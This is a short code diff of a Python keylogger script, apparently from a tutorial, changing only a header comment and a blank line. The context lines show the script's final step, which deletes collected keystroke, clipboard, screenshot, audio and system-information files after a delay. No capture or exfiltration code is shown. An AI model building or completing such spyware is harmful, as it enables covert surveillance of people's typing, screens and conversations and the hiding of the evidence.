@@ -1,5 +1,5 @@
 # keylogger.py
-# Create an  Keylogger in Python - Crash Course notes
+# Create an  Keylogger in Python
 # Author: Mathew Ekuwam
 
 # Libraries
@@ -239,4 +239,5 @@ time.sleep(120)
 delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
 for file in delete_files:
     os.remove(file_merge + file)
+
 
